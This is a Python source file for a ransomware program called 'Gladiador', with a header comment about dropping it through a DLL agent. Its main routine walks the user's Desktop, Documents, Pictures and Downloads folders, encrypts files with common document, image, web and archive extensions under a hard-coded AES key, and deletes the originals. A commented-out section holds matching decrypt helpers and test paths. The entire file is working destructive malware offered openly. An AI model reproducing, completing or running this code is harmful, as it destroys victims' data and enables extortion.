import os ,random,struct
from Crypto.Cipher import AES 
import string

'''
writer.exe agent to DLL to drop this Ransomware 


'''

class Gladiador:

    def remove_f(self,infile):
        os.remove(infile)

    def encrypt(self):
        out_filename = self.in_filename+".encrypted"
        iv =  ' '.join(random.choices(string.ascii_letters+string.digits,k=16)).encode("utf-8").replace(b' ',b'') 
        cipher = AES.new(self.key,AES.MODE_CBC,iv)
        filesize = os.path.getsize(self.in_filename)
        with open(self.in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q',filesize))
                outfile.write(iv)
                while True: 
                    chunk = infile.read()
                    if len(chunk) == 0 :
                        break
                    elif len(chunk) % 16 != 0 :
                        chunk += b' ' * (16 - len(chunk)%16 )
                    outfile.write(cipher.encrypt(chunk))
        self.remove_f(self.in_filename)
                    

    def decrypt(self):
        out2file = self.in_filename.replace(".encrypted","") 
        with open(self.in_filename,'rb') as outfile:
            binary_string = outfile.read()
            size = struct.unpack('<Q',binary_string[:8])
            size = size[0]
            iv=binary_string[8:24]
            binary_string_original = binary_string[24:]
            cipher = AES.new(self.key,AES.MODE_CBC,iv)
            decrypted = cipher.decrypt(binary_string_original)
            with open(out2file,'wb') as cleartext :
                cleartext.write(decrypted)
                cleartext.close()
                
            outfile.close()
        os.remove(out2file+".encrypted")

    def __init__(self,key,in_filename):
        self.key = key
        self.in_filename = in_filename




if __name__ == '__main__':
    
    #get username
    USER = os.getlogin()
    #locations to lookup
    LOCATIONS = ["Desktop","Documents","Pictures","Downloads"]
    #extensions to encode
    EXT = [
        ".txt",
        ".png",
        ".jpg",
        ".pdf",
        ".png",
        ".php",
        ".html",
        ".htm",
        ".aspx",
        ".asp",
        ".js",
        ".mp4",
        ".mp3",
        ".bk",
        ".zip",
        ".rar",
        ".gif",
        ".ppt",
        ".jpeg",
        ".xsl",
        ".ascx",
        ".json",
        ".pptx"            
        ]
    secret = 'this is a key123'.encode("utf-8")
    
    for location in LOCATIONS:
        path = "C:\\Users\\"+USER+"\\"+location+"\\"
        for root,dirs,files in os.walk(path):
            for file in files:
                x,y = os.path.splitext(path+file)
                if file == "gladiador.py":
                    pass
                elif y.lower() in EXT:
                    obj = Gladiador(secret,os.path.join(root, file))
                    obj.encrypt()
       
    '''
    window_path ="C:\\Users\\antho\\Desktop\\ransomware\\"
    linux_path="/media/ransomware/"
    path = window_path
    
    
    def fuckit():
        for root,dirs,files in os.walk(path):
            for file in files:
                x,y = os.path.splitext(path+file)
                if file == "gladiador.py":
                    pass
                elif y.lower() in EXT:
                    obj = Gladiador(secret,os.path.join(root, file))
                    obj.encrypt()
            


    def dontFuckit():
        for root,dirs,files in os.walk(path):
            for file in files:
                x,y = os.path.splitext(path+file)
                if file == "gladiador.py":
                    pass
                elif ".encrypted" in file:
                    obj = Gladiador(secret,os.path.join(root, file))
                    obj.decrypt()
    
    dontFuckit()
  
    '''
            
      



